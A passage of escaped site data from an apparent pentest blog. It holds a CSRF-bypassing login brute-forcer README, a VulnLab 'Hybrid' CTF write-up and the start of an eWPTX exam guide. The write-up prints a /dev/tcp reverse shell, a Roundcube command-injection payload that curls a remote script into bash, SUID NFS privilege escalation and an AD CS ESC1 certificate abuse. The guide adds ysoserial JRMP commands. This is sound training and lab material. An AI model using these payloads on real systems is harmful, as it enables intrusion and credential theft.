alt=\&quot;2281177a06e72ef9d8dff96ba560b3c4.png\&quot; width=\&quot;347\&quot; height=\&quot;217\&quot; /&gt;&quot;],&quot;filePath&quot;:[0,&quot;src/content/posts/writeup-vulnlab-baby2.mdx&quot;],&quot;digest&quot;:[0,&quot;00ec131181455ece&quot;],&quot;deferredRender&quot;:[0,true],&quot;collection&quot;:[0,&quot;posts&quot;],&quot;slug&quot;:[0,&quot;writeup-vulnlab-baby2&quot;],&quot;render&quot;:[0,null],&quot;imageMeta&quot;:[0,{&quot;src&quot;:[0,&quot;/_astro/baby2-machine._EBpjsn1.png&quot;],&quot;width&quot;:[0,1286],&quot;height&quot;:[0,630],&quot;format&quot;:[0,&quot;png&quot;]}],&quot;isSuperseded&quot;:[0,false]}],[0,{&quot;id&quot;:[0,&quot;waffles-force.mdx&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;WafflesFORCE: Login Brute-Forcer with CSRF Bypass&quot;],&quot;date&quot;:[3,&quot;2024-07-16T00:00:00.000Z&quot;],&quot;image&quot;:[0,&quot;heroImages/waffles-force.png&quot;],&quot;tags&quot;:[1,[[0,&quot;Brute Force&quot;],[0,&quot;CSRF Bypass&quot;],[0,&quot;Python&quot;],[0,&quot;Web Security&quot;],[0,&quot;Pentesting&quot;],[0,&quot;Red Team&quot;],[0,&quot;Security Tools&quot;]]],&quot;description&quot;:[0,&quot;A multi-threaded login brute-forcer designed to bypass CSRF token protection by automatically capturing and injecting tokens per request.&quot;],&quot;featured&quot;:[0,0],&quot;repo&quot;:[0,&quot;andrecrafts/WafflesFORCE&quot;],&quot;stars&quot;:[0,9],&quot;projectSlug&quot;:[0,&quot;andrecrafts/WafflesFORCE&quot;]}],&quot;body&quot;:[0,&quot;import Image from &#39;src/components/ImageLocal.astro&#39;;\n\n## Overview\n\nThis tool is designed to brute force website&#39;s logins and bypass CSRF token protection. \n\nIt achieves this by automatically capturing the CSRF token based on regex before each login attempt.\n\n\n## Features\n- **Automatic CSRF handling** - fetches and extracts CSRF tokens (custom regex/param/url) and injects them per request.\n- **Multi-threaded** - parallelized login attempts (`--threads`) for higher throughput.\n- **Flexible inputs** - supports username/password wordlists or single values (`--users`, `--passwords`, `--user`, `--password`) and customizable POST body (`--data`).\n- **Match verification** - validate attempts via status-code ranges (`--match-status`) and response regex (`--match-regex`).\n- **Output &amp; logging** - save results to file (`--output`) and enable verbose/debug output (`--verbose`).\n- **Transport control** - HTTP/S support with optional SSL verification toggle (`--verify`).\n- **Extensible config** - many options (CSRF regex/param/url, custom delimiter/data, etc.) for adapting to different login flows.\n\n## Preview\n&lt;Image src=\&quot;images/349054805-6572f919-b586-405a-a365-ebeef00830a2.png\&quot; alt=\&quot;349054805-6572f919-b586-405a-a365-ebeef00830a2.png\&quot; width=\&quot;469\&quot; height=\&quot;211\&quot;/&gt;\n\n## Installation\n\n```bash\ngit clone https://github.com/WafflesExploits/WafflesFORCE.git\ncd WafflesFORCE\npython3 wafflesforce.py ...\n```\n\n## Usage\n\n### Basic Configuration\n\nThe tool requires two key parameters for CSRF token handling:\n\n```\n--csrf-regex : Regex pattern to capture the CSRF token from response\n--csrf-param : Name of the CSRF token parameter in the POST request\n```\n\n### Example Commands\n\n**Basic Usage:**\n```bash\npython3 wafflesforce.py \\\n  --host \&quot;https://example.com/login\&quot; \\\n  --data &#39;username=*USER*&amp;password=*PASS*&#39; \\\n  -U &#39;users.txt&#39; \\\n  -P &#39;passwords.txt&#39; \\\n  -mr &#39;/dashboard&#39; \\\n  -ms &#39;200-299,301,302&#39; \\\n  --csrf-param &#39;csrf&#39; \\\n  --csrf-regex &#39;name=\&quot;csrf\&quot; value=\&quot;(.*?)\&quot;&gt;&#39; \\\n  --threads 5 \\\n  --output results.txt\n```\n\n**With Custom CSRF URL:**\n```bash\npython3 wafflesforce.py \\\n  --host \&quot;https://example.com/login\&quot; \\\n  --csrf-url \&quot;https://example.com/login\&quot; \\\n  --data &#39;username=*USER*&amp;password=*PASS*&#39; \\\n  -U &#39;users.txt&#39; \\\n  -P &#39;passwords.txt&#39; \\\n  -mr &#39;/dashboard&#39; \\\n  -ms &#39;200-299,301,302&#39; \\\n  --csrf-param &#39;csrf&#39; \\\n  --csrf-regex &#39;name=\&quot;csrf\&quot; value=\&quot;(.*?)\&quot;&gt;&#39; \\\n  --threads 5 \\\n  --output results.txt\n```\n\n## Command Reference\n\n```\nOptions:\n  --host HOST              Target URL\n  -U, --users              Path to usernames wordlist\n  -u, --user               Single username\n  -P, --passwords          Path to passwords wordlist\n  -p, --password           Single password\n  -cr, --csrf-regex        Regex pattern to extract CSRF token\n  -cp, --csrf-param        CSRF parameter name for POST request\n  -cu, --csrf-url          URL to fetch CSRF token from\n  -mr, --match-regex       Regex pattern to verify successful login\n  -ms, --match-status      Status codes to match (default: 200-299,301,302)\n  -d, --data               POST request body parameters\n  -t, --threads            Number of threads (default: 5)\n  -o, --output             Output file for results\n  -vr, --verify            Disable SSL verification\n  --verbose                Enable verbose/debug output\n```&quot;],&quot;filePath&quot;:[0,&quot;src/content/projects/waffles-force.mdx&quot;],&quot;digest&quot;:[0,&quot;65806b97818349c6&quot;],&quot;deferredRender&quot;:[0,true],&quot;collection&quot;:[0,&quot;projects&quot;],&quot;slug&quot;:[0,&quot;waffles-force&quot;],&quot;render&quot;:[0,null],&quot;imageMeta&quot;:[0,{&quot;src&quot;:[0,&quot;/_astro/waffles-force.DSCEwXiZ.png&quot;],&quot;width&quot;:[0,1285],&quot;height&quot;:[0,630],&quot;format&quot;:[0,&quot;png&quot;]}],&quot;isSuperseded&quot;:[0,false]}],[0,{&quot;id&quot;:[0,&quot;writeup-vulnlab-hybrid.mdx&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;Write-up: VulnLab - Hybrid (Chain) &quot;],&quot;date&quot;:[3,&quot;2024-06-22T00:00:00.000Z&quot;],&quot;image&quot;:[0,&quot;heroImages/hybrid-chain.png&quot;],&quot;tags&quot;:[1,[[0,&quot;Write-up&quot;],[0,&quot;CTF&quot;],[0,&quot;Red Team&quot;],[0,&quot;Walkthrough&quot;],[0,&quot;VulnLab&quot;],[0,&quot;AD Pentest&quot;],[0,&quot;Python&quot;],[0,&quot;Active Directory&quot;],[0,&quot;Hacking&quot;]]],&quot;description&quot;:[0,&quot;Write-up for VulnLab&#39;s Hybrid (Chain).&quot;],&quot;featured&quot;:[0,0],&quot;projectSlug&quot;:[0]}],&quot;body&quot;:[0,&quot;import Image from &#39;src/components/ImageLocal.astro&#39;;\n\n## Info\n- Hybrid wiki info: [1](https://wiki.vulnlab.com/guidance/easy/hybrid-chain)\n\n## Nmap\n\nI used Nmap to scan both machines using the command below:\n\n```bash\nexport ip=10.10.140.85-86\nports=$(sudo nmap -sS -p- --min-rate=1000 -T4 $ip -o nmap-alltcp.txt | grep -oP \&quot;^\\d+\&quot; | tr \&quot;\\n\&quot; \&quot;,\&quot; | sed &#39;s/,$//&#39;);sudo nmap -sS -sV -sC -O -T4 $ip -p$ports | grep -vP \&quot;closed|filtered\&quot; &gt; nmap-enum.txt\n```\n\n```bash\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-22 06:11 EDT\nNmap scan report for 10.10.140.85\nHost is up (0.042s latency).\n\nPORT      STATE    SERVICE       VERSION\n53/tcp    open     domain        Simple DNS Plus\n135/tcp   open     msrpc         Microsoft Windows RPC\n139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp   open     microsoft-ds?\n464/tcp   open     kpasswd5?\n593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0\n3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=dc01.hybrid.vl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.hybrid.vl\n| Not valid before: 2023-06-17T14:05:41\n|_Not valid after:  2024-06-16T14:05:41\n|_ssl-date: 2024-06-22T10:13:36+00:00; -4s from scanner time.\n3269/tcp  open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)\n|_ssl-date: 2024-06-22T10:13:36+00:00; -4s from scanner time.\n| ssl-cert: Subject: commonName=dc01.hybrid.vl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.hybrid.vl\n| Not valid before: 2023-06-17T14:05:41\n|_Not valid after:  2024-06-16T14:05:41\n3389/tcp  open     ms-wbt-server Microsoft Terminal Services\n|_ssl-date: 2024-06-22T10:13:36+00:00; -4s from scanner time.\n| ssl-cert: Subject: commonName=dc01.hybrid.vl\n| Not valid before: 2024-06-21T09:54:15\n|_Not valid after:  2024-12-21T09:54:15\n| rdp-ntlm-info: \n|   Target_Name: HYBRID\n|   NetBIOS_Domain_Name: HYBRID\n|   NetBIOS_Computer_Name: DC01\n|   DNS_Domain_Name: hybrid.vl\n|   DNS_Computer_Name: dc01.hybrid.vl\n|   Product_Version: 10.0.20348\n|_  System_Time: 2024-06-22T10:12:56+00:00\n49667/tcp open     msrpc         Microsoft Windows RPC\n60112/tcp open     msrpc         Microsoft Windows RPC\n60140/tcp open     msrpc         Microsoft Windows RPC\nDevice type: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2022 (89%)\nAggressive OS guesses: Microsoft Windows Server 2022 (89%)\nNo exact OS matches for host (test conditions non-ideal).\nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time: \n|   date: 2024-06-22T10:12:57\n|_  start_date: N/A\n|_clock-skew: mean: -4s, deviation: 0s, median: -4s\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n\nNmap scan report for 10.10.140.86\nHost is up (0.042s latency).\n\nPORT      STATE  SERVICE          VERSION\n22/tcp    open   ssh              OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 60:bc:22:26:78:3c:b4:e0:6b:ea:aa:1e:c1:62:5d:de (ECDSA)\n|_  256 a3:b5:d8:61:06:e6:3a:41:88:45:e3:52:03:d2:23:1b (ED25519)\n25/tcp    open   smtp             Postfix smtpd\n|_smtp-commands: mail01.hybrid.vl, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, AUTH PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING\n80/tcp    open   http             nginx 1.18.0 (Ubuntu)\n|_http-title: Redirecting...\n|_http-server-header: nginx/1.18.0 (Ubuntu)\n110/tcp   open   pop3             Dovecot pop3d\n|_ssl-date: TLS randomness does not represent time\n|_pop3-capabilities: CAPA SASL RESP-CODES TOP STLS PIPELINING AUTH-RESP-CODE UIDL\n| ssl-cert: Subject: commonName=mail01\n| Subject Alternative Name: DNS:mail01\n| Not valid before: 2023-06-17T13:20:17\n|_Not valid after:  2033-06-14T13:20:17\n111/tcp   open   rpcbind          2-4 (RPC #100000)\n| rpcinfo: \n|   program version    port/proto  service\n|   100000  2,3,4        111/tcp   rpcbind\n|   100000  2,3,4        111/udp   rpcbind\n|   100000  3,4          111/tcp6  rpcbind\n|   100000  3,4          111/udp6  rpcbind\n|   100003  3,4         2049/tcp   nfs\n|   100003  3,4         2049/tcp6  nfs\n|   100005  1,2,3      44030/udp6  mountd\n|   100005  1,2,3      48323/tcp   mountd\n|   100005  1,2,3      57473/tcp6  mountd\n|   100005  1,2,3      57804/udp   mountd\n|   100021  1,3,4      33517/tcp6  nlockmgr\n|   100021  1,3,4      35906/udp6  nlockmgr\n|   100021  1,3,4      37939/tcp   nlockmgr\n|   100021  1,3,4      54323/udp   nlockmgr\n|   100024  1          37803/tcp6  status\n|   100024  1          47943/udp   status\n|   100024  1          48418/udp6  status\n|   100024  1          52995/tcp   status\n|   100227  3           2049/tcp   nfs_acl\n|_  100227  3           2049/tcp6  nfs_acl\n143/tcp   open   imap             Dovecot imapd (Ubuntu)\n|_imap-capabilities: SASL-IR LOGIN-REFERRALS more OK have post-login listed ENABLE LITERAL+ IDLE LOGINDISABLEDA0001 Pre-login IMAP4rev1 capabilities ID STARTTLS\n| ssl-cert: Subject: commonName=mail01\n| Subject Alternative Name: DNS:mail01\n| Not valid before: 2023-06-17T13:20:17\n|_Not valid after:  2033-06-14T13:20:17\n|_ssl-date: TLS randomness does not represent time\n587/tcp   open   smtp             Postfix smtpd\n|_smtp-commands: mail01.hybrid.vl, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, AUTH PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING\n993/tcp   open   ssl/imap         Dovecot imapd (Ubuntu)\n|_imap-capabilities: SASL-IR LOGIN-REFERRALS more AUTH=PLAIN have post-login AUTH=LOGINA0001 ENABLE LITERAL+ listed IMAP4rev1 IDLE OK capabilities ID Pre-login\n|_ssl-date: TLS randomness does not represent time\n| ssl-cert: Subject: commonName=mail01\n| Subject Alternative Name: DNS:mail01\n| Not valid before: 2023-06-17T13:20:17\n|_Not valid after:  2033-06-14T13:20:17\n995/tcp   open   ssl/pop3         Dovecot pop3d\n|_pop3-capabilities: CAPA SASL(PLAIN LOGIN) RESP-CODES TOP USER PIPELINING AUTH-RESP-CODE UIDL\n| ssl-cert: Subject: commonName=mail01\n| Subject Alternative Name: DNS:mail01\n| Not valid before: 2023-06-17T13:20:17\n|_Not valid after:  2033-06-14T13:20:17\n|_ssl-date: TLS randomness does not represent time\n2049/tcp  open   nfs_acl          3 (RPC #100227)\n37939/tcp open   nlockmgr         1-4 (RPC #100021)\n48323/tcp open   mountd           1-3 (RPC #100005)\n50411/tcp open   mountd           1-3 (RPC #100005)\n50515/tcp open   mountd           1-3 (RPC #100005)\n52995/tcp open   status           1 (RPC #100024)\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.94SVN%E=4%D=6/22%OT=22%CT=53%CU=37469%PV=Y%DS=2%DC=I%G=Y%TM=667\nOS:6A403%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A\nOS:)OPS(O1=M4D4ST11NW7%O2=M4D4ST11NW7%O3=M4D4NNT11NW7%O4=M4D4ST11NW7%O5=M4D\nOS:4ST11NW7%O6=M4D4ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3\nOS:)ECN(R=Y%DF=Y%T=40%W=F507%O=M4D4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+\nOS:%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)\nOS:T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A\nOS:=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%D\nOS:F=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=4\nOS:0%CD=S)\n\nNetwork Distance: 2 hops\nService Info: Host:  mail01.hybrid.vl; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n```\n\n## Exposed NFS Share\n\nFrom the Nmap scan, we can see NFS is open. You can check which shares are exposed with `showmount` command:\n\n- &lt;Image src=\&quot;images/Picture1.png\&quot; alt=\&quot;Picture1.png\&quot; width=\&quot;255\&quot; height=\&quot;80\&quot;/&gt;\n\nAfter mounting the share, you should see a file named `backup.tar.gz`. To extract it, you can use the following command:\n\n```bash\ntar -xf backup.tar.gz\n```\n\nThe file `etc/dovecot/dovecot-users` contains credentials:\n\n&lt;Image src=\&quot;images/Picture2.png\&quot; alt=\&quot;Picture2.png\&quot; width=\&quot;399\&quot; height=\&quot;57\&quot;/&gt;\n\n## Initial Compromise\n\nYou can use the credentials we found earlier to login into Roundcube:\n\n- &lt;Image src=\&quot;images/Picture3.png\&quot; alt=\&quot;Picture3.png\&quot; width=\&quot;250\&quot; height=\&quot;156\&quot;/&gt;\n\nAfter logging in, you should see an email in the Sent section talking about \&quot;Roundcube junk filter plugin\&quot; being enabled.\n\nThis plugin has a known Command injection vulnerability, that we can exploit to gain a web shell. More about the vulnerability here: https://cyberthint.io/roundcube-markasjunk-command-injection-vulnerability/\n\n1.  Create the file `revshell` with the following contents:\n\n```bash\nbash -i &gt;&amp; /dev/tcp/&lt;YOUR_IP_HERE&gt;/4444 0&gt;&amp;1\n```\n\n2.  In the same directory of `revshell` file, start a python server:\n\n```bash\npython -m http.server 80\n```\n\n3.  Open a new tab in the terminal, and listen to incoming connections with netcat:\n\n```bash\nnc -lvp 4444\n```\n\n4.  Go to `Settings &gt; Identities`.\n5.  Change your Email to the one below:\n    - Don’t forget to match the IP to your machine VPN’s address.\n\n```bash\nadmin&amp;curl${IFS}&lt;YOUR_IP_HERE&gt;/revshell${IFS}|${IFS}bash&amp;@hybrid.vl\n```\n\n6.  Move the &#39;New spawn plugin&#39; email to the Junk Section:\n    - &lt;Image src=\&quot;images/Picture4.png\&quot; alt=\&quot;Picture4.png\&quot; width=\&quot;322\&quot; height=\&quot;180\&quot;/&gt;\n7.  You should get a shell for user `www-data`.\n    - &lt;Image src=\&quot;images/Picture5.png\&quot; alt=\&quot;Picture5.png\&quot; width=\&quot;294\&quot; height=\&quot;35\&quot;/&gt;\n\n## Privilege Escalation via NFS using bash with SUID\n\nIn the home directory, there is a folder for the user [peter.turner@hybrid.vl](mailto:peter.turner@hybrid.vl).\n\nWe can use the NFS Share to impersonate the user `peter.turner.`\n\n1.  Get the UID of `peter.turner`:\n    - &lt;Image src=\&quot;images/566c3e6250f025090d5a5f5b977c47b4.png\&quot; alt=\&quot;566c3e6250f025090d5a5f5b977c47b4.png\&quot; width=\&quot;264\&quot; height=\&quot;30\&quot;/&gt;\n2.  Edit `/etc/login.defs`, and set the UID_MAX to a value greater than the UID of the victim user.\n    - In this example, I used `902601109` since its greater than the user&#39;s UID.\n    - &lt;Image src=\&quot;images/dba1987851e2cc700b7b8a63ea652d84.png\&quot; alt=\&quot;dba1987851e2cc700b7b8a63ea652d84.png\&quot; width=\&quot;246\&quot; height=\&quot;63\&quot;/&gt;\n3.  Follow the instructions below:\n\n```bash\n# --Victim&#39;s Machine--\n#1. Copy bash executable to the NFS Share\ncp /bin/bash /opt/share/bash\n```\n\n```bash\n# --Attacker&#39;s Machine--\n#2. Add the peter.turner user and login into it\nsudo useradd peter.turner@hybrid.vl -u 902601108 # Add user with Specific UID\nsudo usermod -aG sudo peter.turner@hybrid.vl # Add user to sudo group\nsudo passwd peter.turner@hybrid.vl # Change user password\nsudo su -l peter.turner@hybrid.vl # Login to user\n#3. Mount the exposed NFS Share\nmkdir /tmp/nfs\nsudo mount -o rw,vers=[2|3] &lt;Victim_IP&gt;:/&lt;share&gt; /tmp/nfs -o nolock\n#4. Copy bash executable to your machine\ncp /tmp/nfs/bash /tmp/bash\nrm /tmp/nfs/bash\n#5. Add the SUID privilege to the bash and send it to the NFS Share\ncp /tmp/bash /tmp/nfs/bash\nsudo chmod +s /tmp/nfs/bash\n#6. Delete the user you created:\nuserdel peter.turner@hybrid.vl\n```\n\n```bash\n# --Victim&#39;s Machine--\n#7. Execute bash executable with SUID, from the NFS Share, to impersonate the user\n/opt/share/bash -p\n```\n\nIf you run the `id` command, you should get a result similar to the one below:\n\n- ![Picture6.png](/assets/Picture6.png)\n\n### User1 flag\n\nIf you access `/home/peter.turner@hybrid.vl`, you should get the user1 flag.\n\n## Extract credentials from passwords.kdbx\n\nIn peter.turner&#39;s home directory, you should also see a `passwords.kdbx` file.\n\nThis is a KeePass file, we can read it by using the [kpcli](https://github.com/rebkwok/kpcli) tool.\n\n1.  Copy the file to your machine via the NFS share.\n2.  You will need the master&#39;s password for extracting the file&#39;s contents. You can use peter.turner&#39;s password that we found earlier in dovecot-users.\n3.  Use [kpcli](https://github.com/rebkwok/kpcli) to get peter.turner&#39;s domain password:\n    - &lt;Image src=\&quot;images/0efddfc862185ba3c123c5df510e54b5.png\&quot; alt=\&quot;0efddfc862185ba3c123c5df510e54b5.png\&quot; width=\&quot;358\&quot; height=\&quot;101\&quot;/&gt;\n    - &lt;Image src=\&quot;images/be3967f4c5de9ee1b66270c8490af8b9.png\&quot; alt=\&quot;be3967f4c5de9ee1b66270c8490af8b9.png\&quot; width=\&quot;179\&quot; height=\&quot;206\&quot;/&gt;\n\nYou can use the password above to login to peter.turner via SSH.\n\n```bash\nssh peter.turner@hybrid.vl@10.10.231.6\n```\n\nIt seems we can run all commands as sudo:\n\n- &lt;Image src=\&quot;images/280a7e38756e39fa05b9789ff859aa0e.png\&quot; alt=\&quot;280a7e38756e39fa05b9789ff859aa0e.png\&quot; width=\&quot;412\&quot; height=\&quot;82\&quot;/&gt;\n\n### User2 flag\n\nYou can now get the user2 flag:\n\n```bash\nsudo cat /root/flag.txt\n```\n\n## Exploit AD Certificates - ESC1 Vulnerability\n\nWe can use peter.turner&#39;s credentials to access `hybrid.vl`:\n\n- &lt;Image src=\&quot;images/Picture7.png\&quot; alt=\&quot;Picture7.png\&quot; width=\&quot;582\&quot; height=\&quot;65\&quot;/&gt;\n\nBy using `certipy-ad` with peter.turner&#39;s creds, we can see that the AD CS has a vulnerability:\n\n- &lt;Image src=\&quot;images/Picture8.png\&quot; alt=\&quot;Picture8.png\&quot; width=\&quot;633\&quot; height=\&quot;18\&quot;/&gt;\n- &lt;Image src=\&quot;images/Picture9.png\&quot; alt=\&quot;Picture9.png\&quot; width=\&quot;639\&quot; height=\&quot;47\&quot;/&gt;\n\nThis means, any Domain Computer can request a Certificate for any user. We can use this to impersonate the administrator user.\n\nMail01 is a computer that we compromised earlier. We can find kerberos credentials for it in `/etc/krb5.keytab`.\n\nHowever since it’s encrypted, we need to use a tool, like [keytabextract.py](https://github.com/sosdave/KeyTabExtract/blob/master/keytabextract.py), to extract the credentials:\n\n1.  Copy the krb.5keytab to your machine via the NFS share.\n2.  Use keytabextract.py:\n    - &lt;Image src=\&quot;images/Picture10.png\&quot; alt=\&quot;Picture10.png\&quot; width=\&quot;449\&quot; height=\&quot;104\&quot;/&gt;\n\nNow, we can use Mail01$’s credentials to request a certificate for the Administrator user:\n\n```bash\ncertipy-ad req -dc-ip $ip -ca hybrid-DC01-CA -target hybrid.vl -template HybridComputers -upn &#39;administrator@HYBRID.VL&#39; -dns dc01.hybrid.vl -u &#39;MAIL01$@HYBRID.VL&#39; -hashes &#39;0f916c5246fdbc7ba95dcef4126d57bd&#39; -key-size 4096\n```\n\n- &lt;Image src=\&quot;images/Picture11.png\&quot; alt=\&quot;Picture11.png\&quot; width=\&quot;575\&quot; height=\&quot;148\&quot;/&gt;\n\nNext, I tried using this certificate to authenticate, but I got an error:\n\n- &lt;Image src=\&quot;images/Picture12.png\&quot; alt=\&quot;Picture12.png\&quot; width=\&quot;615\&quot; height=\&quot;171\&quot;/&gt;\n\nI managed to circumvent this error by using a ldap shell to change the user password:\n\n- &lt;Image src=\&quot;images/Picture13.png\&quot; alt=\&quot;Picture13.png\&quot; width=\&quot;802\&quot; height=\&quot;55\&quot;/&gt;\n- &lt;Image src=\&quot;images/Picture14.png\&quot; alt=\&quot;Picture14.png\&quot; width=\&quot;375\&quot; height=\&quot;64\&quot;/&gt;\n\n### Root flag\n\nFinally, I used `evil-winrm` to get a shell and get the root flag.\n\n- &lt;Image src=\&quot;images/Picture15.png\&quot; alt=\&quot;Picture15.png\&quot; width=\&quot;434\&quot; height=\&quot;51\&quot;/&gt;\n- &lt;Image src=\&quot;images/Picture16.png\&quot; alt=\&quot;Picture16.png\&quot; width=\&quot;419\&quot; height=\&quot;131\&quot;/&gt;&quot;],&quot;filePath&quot;:[0,&quot;src/content/posts/writeup-vulnlab-hybrid.mdx&quot;],&quot;digest&quot;:[0,&quot;74a3439f6a697fb9&quot;],&quot;deferredRender&quot;:[0,true],&quot;collection&quot;:[0,&quot;posts&quot;],&quot;slug&quot;:[0,&quot;writeup-vulnlab-hybrid&quot;],&quot;render&quot;:[0,null],&quot;imageMeta&quot;:[0,{&quot;src&quot;:[0,&quot;/_astro/hybrid-chain.xKnyC1le.png&quot;],&quot;width&quot;:[0,1286],&quot;height&quot;:[0,630],&quot;format&quot;:[0,&quot;png&quot;]}],&quot;isSuperseded&quot;:[0,false]}],[0,{&quot;id&quot;:[0,&quot;how-to-pass-ewptx-free-materials-only.mdx&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;How to Pass eWPTXv2 with Free Materials Only&quot;],&quot;date&quot;:[3,&quot;2024-05-22T00:00:00.000Z&quot;],&quot;image&quot;:[0,&quot;heroImages/pass-ewptx.png&quot;],&quot;tags&quot;:[1,[[0,&quot;Certifications&quot;],[0,&quot;Guide&quot;],[0,&quot;Web Pentest&quot;],[0,&quot;eLearnSecurity&quot;],[0,&quot;Guide&quot;],[0,&quot;Exam&quot;],[0,&quot;INE&quot;]]],&quot;description&quot;:[0,&quot;A comprehensive guide on how to pass the eWPTXv2 certification using only free resources.&quot;],&quot;featured&quot;:[0,0],&quot;projectSlug&quot;:[0]}],&quot;body&quot;:[0,&quot;## Why did I create this guide?\nI created this guide to answer the question: \n\n- Is it possible to pass the eWPTXv2 without paying for INE&#39;s course?\n\nYes, it is possible, and I&#39;ll show you how I did it!\n\n## What and where to learn\nI used the eWPTXv2 syllabus to make a list of topics to study. \n\nYou can use [PortSwigger&#39;s Academy](https://portswigger.net/web-security/all-topics) to learn about most vulnerabilities:\n- SQL Injection\n- Authentication\n    -  OAuth\n    -  JWT Attacks\n- Directory traversal \n- Command Injection \n- Information Disclosure \n- Access Control\n- SSRF\n- XXE Injection\n- XSS\n- CORS\n- CSRF\n- Clickjacking\n- SSTI\n- API Testing\n- GraphQL API\n- Insecure deserialization\n\nPortSwigger covers most of the material you need to learn. However, there are some additional things that I recommend studying as well:\n\n- Learn how to bypass SQL Injection WAF. Example:\n    - `SELECT+1+ FROM users`\n    - `SELECT//1//FROM//users`\n- Learn how to use SQLMap.\n    - [TryHackMe - SQLMap Room](https://tryhackme.com/r/room/sqlmap)\n    - [TryHackMe - Gamezone](https://tryhackme.com/r/room/gamezone)\n    - [HackTricks - SQLMap](https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap)\n- Learn how to use ysoserial&#39;s JRMP Listener/Client.\n    - Usage example:\n    \n```php\n//The JRMPClient causes the server to try establishing a TCP connection to the supplied IP address.\n// 1.  Start the JRMPListener:\nsudo java11 -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 80 CommonsCollections1 \&quot;ping -c 5 10.100.13.200\&quot;\n// 2.  Create a payload with JRMPClient:\nsudo java11 -jar ysoserial-all.jar \&quot;JRMPClient\&quot; \&quot;10.100.13.200:80\&quot; | base64 -w0\n```\n\n## Required Tools\nYou need to learn the tools below to pass the exam:\n- Burp Suite Community\n- Any directory brute-forcer you like: ffuf, gobuster, etc...\n- SQLMap\n- ysoserial\n\n## Practice\n\nBelow is a list of labs I used to prepare for the exam:\n- Business Logic Vulnerabilities\n    - [Authentication bypass via flawed state machine](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-flawed-state-machine)\n    - [Inconsistent security controls](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-security-controls)\n    - [Authentication bypass via encryption oracle](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-encryption-oracle)\n- DOM-Based Vulns\n    - [DOM XSS using web messages and a JavaScript URL](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-a-javascript-url)\n    - [DOM-based open redirection](https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection)\n    - [DOM-based cookie manipulation](https://portswigger.net/web-security/dom-based/cookie-manipulation/lab-dom-cookie-manipulation)\n- Information disclosure\n    - [Authentication bypass via information disclosure](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-authentication-bypass)\n    - [Information disclosure in version control history](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-version-control-history)\n- OS Command Injection\n    - [Blind OS command injection with output redirection](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)\n- File upload vulnerabilities\n    - [Web shell upload via extension blacklist bypass](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass)\n    - [Web shell upload via obfuscated file extension](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension)\n- Path Traversal \n    - [File path traversal, traversal sequences stripped non-recursively](https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively)\n- Access Control\n    - [User ID controlled by request parameter with password disclosure](https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-password-disclosure)\n    - [Multi-step process with no access control on one step](https://portswigger.net/web-security/access-control/lab-multi-step-process-with-no-access-control-on-one-step)\n    - [Referer-based access control](https://portswigger.net/web-security/access-control/lab-referer-based-access-control)\n- Authentication Vulnerabilities\n    - [Broken brute-force protection, IP block](https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block)\n    - [Password reset poisoning via middleware](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware)\n    - [Brute-forcing a stay-logged-in 